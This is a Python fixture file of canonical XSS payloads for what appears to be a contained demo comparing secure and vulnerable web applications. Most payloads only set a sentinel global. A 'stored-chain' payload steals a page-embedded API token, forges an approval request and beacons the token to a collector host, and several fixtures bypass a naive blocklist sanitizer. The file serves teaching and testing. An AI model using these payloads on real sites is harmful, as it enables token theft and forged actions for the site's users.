"""Checked-in canonical XSS payload fixtures.

These are the *only* payloads the demo ever runs — fixed, textbook forms, not
arbitrary attacker input. Each one, **if it executes**, sets a single observable
sentinel global (``window.__scriptjack_xss``) to a per-shape marker. The browser
harness reads that global to decide whether script executed.

Against the secure application none of these execute: the stored form is removed
by the allowlist sanitizer, the reflected form is HTML-escaped, and the DOM form
is written with ``textContent``. The vulnerable application (later slices) is
where they fire.
"""

from __future__ import annotations

from dataclasses import dataclass

# The global an executed payload sets. Reading it is how the harness observes
# script execution without asserting from markup.
SENTINEL_GLOBAL = "__scriptjack_xss"


@dataclass(frozen=True)
class Payload:
    key: str
    marker: str  # value the sentinel takes if this payload executes
    html: str  # the checked-in payload string


def _script(marker: str) -> str:
    return f"<script>window.{SENTINEL_GLOBAL}='{marker}'</script>"


def _img(marker: str) -> str:
    return f"<img src=x onerror=\"window.{SENTINEL_GLOBAL}='{marker}'\">"


def _svg(marker: str) -> str:
    return f"<svg onload=\"window.{SENTINEL_GLOBAL}='{marker}'\"></svg>"


# Stored surface (the capability statement): three canonical shapes.
STORED_PAYLOADS: tuple[Payload, ...] = (
    Payload("stored-script", "stored-script", _script("stored-script")),
    Payload("stored-img-onerror", "stored-img", _img("stored-img")),
    Payload("stored-svg-onload", "stored-svg", _svg("stored-svg")),
)

# Reflected surface (the search ``q`` parameter).
REFLECTED_PAYLOAD = Payload("reflected-script", "reflected", _script("reflected"))

# DOM-based surface (the URL fragment). An image/onerror form works without the
# server ever seeing it.
DOM_PAYLOAD = Payload("dom-img-onerror", "dom", _img("dom"))

# A legitimate, allowlisted capability statement (renders identically everywhere).
LEGITIMATE_CAPABILITY = "<p><strong>Legitimate</strong> capability with <em>formatting</em>.</p>"


# The full contained takeover chain, as a single checked-in fixture. When it
# executes it: (1) reads the page-embedded API token, (2) approves the attacker's
# own vendor as the reviewer — the browser attaches the HttpOnly cookie itself, so
# the script never needs to read it — and (3) beacons the token to the in-network
# collector. It performs no other action.
CHAIN_TARGET_VENDOR = "v-northwind"
CHAIN_PAYLOAD = Payload(
    key="stored-chain",
    marker="chain",
    html=(
        '<img src=x onerror="'
        "window.__scriptjack_xss='chain';"
        "var m=document.querySelector('meta[name=scriptjack-api-token]');"
        "var t=m?m.getAttribute('content'):'';"
        "fetch('/vendors/v-northwind/approve',{method:'POST',headers:{'X-Api-Token':t}});"
        "navigator.sendBeacon('http://collector:8000/beacon',JSON.stringify({token:t,vendor:'v-northwind'}));"
        '">'
    ),
)


# Half-fixed variant fixtures (SLICE-003b): the literal <script> is stripped by the
# naive blocklist and does not execute; the other three each bypass it and execute.
HALF_FIXED_STRIPPED = Payload(
    key="half-stripped",
    marker="half-stripped",
    html=_script("half-stripped"),
)
HALF_FIXED_BYPASSES: tuple[Payload, ...] = (
    Payload("half-img", "half-img", _img("half-img")),
    Payload("half-svg", "half-svg", _svg("half-svg")),
    Payload(
        "half-nested",
        "half-nested",
        f"<scr<script>ipt>window.{SENTINEL_GLOBAL}='half-nested'</scr<script>ipt>",
    ),
)

# CSP-alone demonstration (SLICE-003b): injected into a still-vulnerable sink but
# blocked from executing by the nonce CSP with no unsafe-inline.
CSP_DEMO_PAYLOAD = Payload("csp-demo", "csp-demo", _img("csp-demo"))
